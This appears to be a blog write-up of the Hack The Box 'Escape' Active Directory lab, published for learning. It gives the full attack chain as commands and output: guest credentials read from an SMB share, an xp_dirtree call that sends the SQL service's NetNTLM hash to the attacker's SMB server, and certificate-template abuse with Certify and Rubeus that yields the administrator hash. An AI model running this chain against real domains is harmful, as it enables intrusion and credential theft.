---
title: "Hack The Box - Escape [Medium]"
date: 2023-03-23T02:01:27+03:00
draft: true
description: 
---

This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I've seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine. 

I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!

## Enumerating

I started with a simple `nmap` scan.

```bash
$ nmap -Pn 10.10.11.202
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.

Eventually, after trying most of them, I landed on `smbclient`

```bash
$ smbclient --no-pass -L 10.10.11.202
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Public          Disk      
SYSVOL          Disk      Logon server share 
```

This is a list of shared folders, the one that we can take a look at is `Public`

```bash
$ smbclient -N //10.10.11.202/Public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

  5184255 blocks of size 4096. 1276406 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (62.8 KiloBytes/sec) (average 62.8 KiloBytes/sec)
```

Opening, the PDF states that we can use `PublicUser:GuestUserCantWrite1` to log in to the SQL Server. We can use the `impacket-mssqlclient` which is a tool 

```bash
$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
```

Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.

Now most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what's going on, so I will do my best to explain it.

Following up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:

I checked if I can execute `xp_dirtree`:

```SQL
SQL> EXEC sp_helprotect 'xp_dirtree';
Owner    Object                 Grantee        Grantor   ProtectType   Action           Column   

------   --------------------   ------------   -------   -----------   --------------   ------   

sys      xp_dirtree             public         dbo       b'Grant     '   Execute          .        
```

It turns out I can, so to capture the authentication hash, I need to set up an SMB server:

```bash
# My Machine
$ impacket-smbserver -smb2support smb ./smb
```

And then to execute the `xp_dirtree` on the SQL Server

```SQL
SQL> exec master.dbo.xp_dirtree '\\<myIP>\smb'
```

Doing this would catch the `AUTHENTICATE_MESSAGE`, the user and the hash.

```bash
$ impacket-smbserver -smb2support smb ./smb

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,52180)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000
```

Now I need to crack the hash, I won't post the results here, so you have to figure that one on your own, it is simple enough! :) 

Using the cracked password, I can log in using the `evil-winrm`

```bash
$ evil-winrm --ip 10.10.11.202 --user sql_svc --password $(cat ./password)
```

Now, we need to start enumerating again. I used [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```powershell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> upload /home/syl/tools/win/winPEASany.exe
```

I eventually stumbled across interesting files and I've enumerated the users. The interesting file was `C:\SQLServer\Logs\ERRORLOG.BAK` and upon further inspection I've got the password for the user `Ryan.Cooper`.

```bash
$ evil-winrm --ip 10.10.11.202 --user Ryan.Cooper --password $(cat ./password ryan_password)
...
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> gc ../Desktop/user.txt
<user_hash>
```

Now I needed to escalate, I've used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

I've uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.

> **NOTE**: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify. Unfortunately(or fortunately) there aren't any prebuilt binaries and you have to build it yourself. It is well explained in the README.

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ./Certify.exe find /vulnerable
...
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
```

With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:

```powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

... CERTIFICATE ...

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

I've downloaded the certificate on my machine and ran the command to convert it to `pfx` and I've uploaded it back to the server.

Using another tool called [Rubeus](https://github.com/GhostPack/Rubeus) that I've used to send raw request for a TGT towards the DC.

```powershell
$ ./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /password:123

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::5438:a078:e66d:b560%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
...
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : <NTLM HASH>
```

Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.

I can use that with:

```
$ evil-winrm -H "<NTLM HASH>" -u "administrator" -i 10.10.11.202
M* PS C:\Users\Administrator\Documents> gc ../Desktop/root.txt
<root_hash>
```


# References

- https://blog.zerospl0it.com/posts/Escape/
- https://yu8pentest.blogspot.com/2023/02/escape.html
- https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15
- https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape